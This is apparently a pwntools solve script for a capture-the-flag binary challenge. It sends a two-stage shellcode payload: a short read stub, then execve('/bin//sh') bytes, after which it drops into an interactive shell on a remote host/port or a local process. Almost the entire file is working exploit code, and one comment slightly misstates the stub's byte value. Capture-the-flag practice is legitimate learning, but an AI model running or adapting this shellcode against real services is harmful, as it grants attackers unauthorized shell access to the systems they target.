#!/bin/python

from sys import argv, exit
from pwn import context, gdb, process, remote


def pwn(p: remote | process):
    # ===(shellcode read)===
    # push rax
    # pop rsi
    # xor eax, eax
    # mov dl, 0xe8
    # syscall
    payload = b"\x50\x5e\x31\xc0\xb2\xff\x0f\x05"

    p.sendline(payload)

    payload2 = (
        b"A" * len(payload)
        + b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    )

    p.sendline(payload2)

    p.interactive()
    return


def info(s: str):
    print(f"[i] {s}")


def ok(s: str):
    print(f"[+] {s}")


def debug(s: str):
    print(f"\\___{{ {s}")


if __name__ == "__main__":
    try:
        mode = argv[1]
        if mode == "remote" or mode == "r":
            p = remote(argv[2], argv[3])

        elif mode == "local" or mode == "l":
            p = process(argv[2])

        elif mode == "debug" or mode == "d":
            context.terminal = (
                "kitten @ launch --location=before --cwd=current --bias=65".split()
            )

            p = gdb.debug(argv[2], "b main", env={"SHELL": "/bin/bash"})

        else:
            raise ValueError("wrong arguments")

        pwn(p)

    except (IndexError, ValueError):
        print(
            "Usage : python solve.py remote <ip> <port> or python solve.py local <program_name>"
        )
        exit(1)
